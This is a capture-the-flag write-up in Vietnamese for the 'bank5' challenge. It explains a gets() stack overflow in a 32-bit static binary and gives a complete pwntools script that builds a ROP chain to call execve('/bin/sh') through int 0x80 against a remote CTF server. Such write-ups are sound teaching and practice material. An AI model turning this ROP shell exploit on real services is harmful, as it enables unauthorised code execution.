# **bank 5**

## Task
nc 61.28.237.24 30206

File: bank5

## Solution

Tương tự các bài `bank4-3` thì bài này cũng phân tích hàm `Register`
```c
void Register()
{
  char name[64]; // [esp+Ch] [ebp-4Ch] BYREF
  int balance; // [esp+4Ch] [ebp-Ch]

  balance = 0;
  printf((int)"[+] Please enter your name: ");
  gets(name);
  printf((int)"[+] Thanks for the registration, your balance is %d.\n", balance);

```

Tuy nhiên bài này không còn hàm `getFlag` nữa cho nên chúng ta sẽ thực hiện thông qua gọi hàm `execve("/bin/sh", 0, 0)` để gọi bash shell

vì file thực thi là 32bit và staticlly nên mình đã sài ROPgadget tool để build gadget gọi hàm `execve`

### Exploit 
code python
```python

from struct import *
import sys
from pwn import *

binary = context.binary = ELF('./bank5')

#pro = process('./bank5')
pro = remote('61.28.237.24', '30206')

rop = ROP(binary)
f = open('solve.txt','wb')



# Padding goes here
p = b'A'*(0x4c+4)

p += p32(0x0806dfab)  # pop edx ; ret
p += p32(0x080d9060)  # @ .data
p += p32(0x0809d514)  # pop eax ; ret
p += b'/bin'
p += p32(0x08056ca5)  # mov dword ptr [edx], eax ; ret
p += p32(0x0806dfab)  # pop edx ; ret
p += p32(0x080d9064)  # @ .data + 4
p += p32(0x0809d514)  # pop eax ; ret
p += b'//sh'
p += p32(0x08056ca5)  # mov dword ptr [edx], eax ; ret
p += p32(0x0806dfab)  # pop edx ; ret
p += p32(0x080d9068)  # @ .data + 8
p += p32(0x08056260)  # xor eax, eax ; ret
p += p32(0x08056ca5)  # mov dword ptr [edx], eax ; ret
p += p32(0x080481c9)  # pop ebx ; ret
p += p32(0x0806dfd2)  # pop ecx ; pop ebx ; ret
p += p32(0x080d9068)  # @ .data + 8
p += p32(0x080d9060)  # padding without overwrite ebx
p += p32(0x0806dfab)  # pop edx ; ret
p += p32(0x080d9068)  # @ .data + 8
p += p32(0x08056260)  # xor eax, eax ; ret
p += p32(0x08052003)  # inc eax ; ret
p += p32(0x08052003)  # inc eax ; ret
p += p32(0x08052003)  # inc eax ; ret
p += p32(0x08052003)  # inc eax ; ret
p += p32(0x08052003)  # inc eax ; ret
p += p32(0x08052003)  # inc eax ; ret
p += p32(0x08052003)  # inc eax ; ret
p += p32(0x08052003)  # inc eax ; ret
p += p32(0x08052003)  # inc eax ; ret
p += p32(0x08052003)  # inc eax ; ret
p += p32(0x08052003)  # inc eax ; ret
p += p32(0x08049553)  # int 0x80

f.write(p)

pro.sendline(p)

pro.interactive()

```

gắn đoạn gadget vào địa chỉ trả về và chạy script

## Run script
vì server đã đóng nên mình thực hiện chạy script khai thác local với file flag.txt HCMUSCTF{bank5}

